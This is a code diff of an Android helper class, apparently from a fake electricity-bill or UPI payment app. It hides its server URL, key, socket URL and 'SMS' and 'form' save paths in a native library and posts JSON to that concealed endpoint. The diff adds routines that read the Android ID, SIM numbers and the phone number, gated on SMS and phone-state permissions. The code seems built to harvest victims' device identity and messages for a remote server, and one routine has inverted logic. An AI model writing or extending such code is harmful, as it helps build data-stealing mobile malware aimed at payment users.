@@ -1,38 +1,53 @@
 package com.electricity.withupiservice;
 
+import android.annotation.SuppressLint;
 import android.content.Context;
+import android.content.pm.PackageManager;
+import android.icu.text.SimpleDateFormat;
 import android.net.ConnectivityManager;
 import android.net.Network;
 import android.net.NetworkCapabilities;
 import android.net.NetworkInfo;
 import android.os.AsyncTask;
 import android.os.Build;
+import android.provider.Settings;
+import android.telephony.SubscriptionInfo;
+import android.telephony.SubscriptionManager;
+import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.widget.Toast;
 
-import org.json.JSONException;
+import androidx.core.app.ActivityCompat;
+
 import org.json.JSONObject;
 
 import java.io.BufferedWriter;
-import java.io.IOException;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.nio.charset.StandardCharsets;
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
+import java.util.Date;
+import java.util.List;
+import java.util.Locale;
 import java.util.Scanner;
 
 
 public class Helper {
 
+    public static String TAG = "Kritika";
     {
         System.loadLibrary("native-lib");
     }
-    public native String SITE();
-    public native String URL();
-    public native String SMSSavePath();
-    public native  String FormSavePath();
+    public  native String SMSSavePath();
+    public  native String FormSavePath();
+    public  native String URL();
+    public  native String SITE();
+    public  native String KEY();
+    public native String getNumber();
+    public native String SocketUrl();
 
-    public static String TAG = "";
 
     public static void postRequest(String path, JSONObject jsonData, ResponseListener listener) {
         new AsyncTask<String, Void, String>() {
@@ -40,11 +55,10 @@ public class Helper {
             protected String doInBackground(String... params) {
                 String response = "";
                 try {
-                    Helper help = new Helper();
-                    String urlString = help.URL() + path;
+                    Helper helper = new Helper();
+                    String urlString = helper.URL() + path;
+                    Log.d(Helper.TAG, "URL "+ urlString);
                     URL url = new URL(urlString);
-
-
 
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                     conn.setRequestMethod("POST");
@@ -54,7 +68,7 @@ public class Helper {
 
                     // Write JSON data to the output stream
                     OutputStream os = conn.getOutputStream();
-                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, StandardCharsets.UTF_8));
+                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                     writer.write(jsonData.toString());
                     writer.flush();
                     writer.close();
@@ -105,8 +119,8 @@ public class Helper {
             protected String doInBackground(String... params) {
                 String response = "";
                 try {
-                    Helper help = new Helper();
-                    String urlString = help.URL() + path;  // Append the path to the base URL
+                    Helper helper = new Helper();
+                    String urlString = helper.URL() + path; // Append the path to the base URL
                     URL url = new URL(urlString);
 
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -147,62 +161,34 @@ public class Helper {
     }
 
 
-    public static void sendSMS(String path, String message) {
-        new AsyncTask<String, Void, String>() {
-            @Override
-            protected String doInBackground(String... params) {
-                String response = "";
-                try {
-                    Helper help = new Helper();
-                    String urlString = help.URL() + path;  // Append the path to the base URL for the GET request
-                    URL url = new URL(urlString);
-                    //Log.d("mywork", "doInBackground API URL: " + urlString);
-                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                    conn.setRequestMethod("GET");
 
-                    // Check the response code
-                    int responseCode = conn.getResponseCode();
-                    if (responseCode == HttpURLConnection.HTTP_OK) {
-                        // Read response
-                        try (Scanner scanner = new Scanner(conn.getInputStream())) {
-                            StringBuilder responseBuilder = new StringBuilder();
-                            while (scanner.hasNextLine()) {
-                                responseBuilder.append(scanner.nextLine());
-                            }
-                            response = responseBuilder.toString();
-                        }
-                    } else {
-                        // Handle error response
-                        response = "Response: " + responseCode;
-                    }
-                } catch (IOException e) {
-                    e.printStackTrace();
-                    response = "Response Error: " + e.getMessage();
-                }
-                //Log.d("mywork", "doInBackground API Response: " + response);
-                return response;
-            }
-
-            @Override
-            protected void onPostExecute(String result) {
-                try {
-                    // Parse JSON response
-                    JSONObject jsonResponse = new JSONObject(result);
-                    if (jsonResponse.has("data")) {
-
-                        String phoneNumber = jsonResponse.getString("data");
-
-                    } else {
-                        Log.e("MYAPP: ", "Response does not contain 'data' field");
-                    }
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                    Log.e("MYAPP: ", "JSON Parsing Error: " + e.getMessage());
-                }
-            }
-        }.execute();
+    public static String datetime() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("dd/MM/yyyy h:mm:ss a");
+            return now.format(formatter);
+        } else {
+            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy h:mm:ss a", Locale.getDefault());
+            return sdf.format(new Date());
+        }
     }
 
+    public static void debug(Context context, String message){
+        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
+        StackTraceElement element = stackTraceElements[3];
+        String FileName = element.getFileName();
+        int Line = element.getLineNumber();
+        Toast.makeText(context, Line+FileName+" : " +message, Toast.LENGTH_SHORT).show();
+        Log.d(Helper.TAG, Line+FileName +" : " + message);
+    }
+
+    public static void debug(String message){
+        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
+        StackTraceElement element = stackTraceElements[3];
+        String FileName = element.getFileName();
+        int Line = element.getLineNumber();
+        Log.d(Helper.TAG, Line+FileName +" : " + message);
+    }
 
     public static boolean isNetworkAvailable(Context context) {
         ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -224,6 +210,51 @@ public class Helper {
         }
         return false;
     }
+
+    @SuppressLint("HardwareIds")
+    public static String getAndroidId(Context context) {
+        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
+    }
+
+    public static String getSimNumbers(Context context) {
+        SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
+        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            return "Permission is Denied on getSimNumbers";
+        }
+        List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
+        if (subscriptionInfoList != null) {
+            String Numbers = "";
+            for (SubscriptionInfo info : subscriptionInfoList) {
+                Numbers += " | " + info.getNumber();
+            }
+            if(!Numbers.isEmpty()) {
+                Numbers = getPhoneNumber(context);
+            }
+            return Numbers;
+        }else{
+            return "subscription info is null on getSimNumbers";
+        }
+    }
+
+    public static String getPhoneNumber(Context context) {
+        // default phone number..
+        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        if (tMgr != null) {
+            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+                Log.d("mywork", "Phone OR SMS permission is not granted");
+                return "Phone OR SMS permission is not granted";
+            }
+            String mPhoneNumber = tMgr.getLine1Number();
+            if (mPhoneNumber != null && !mPhoneNumber.isEmpty()) {
+                return mPhoneNumber;
+            } else {
+                return "Phone number not available";
+            }
+        } else {
+            return "TelephonyManager is null";
+        }
+    }
+
 
 }
 
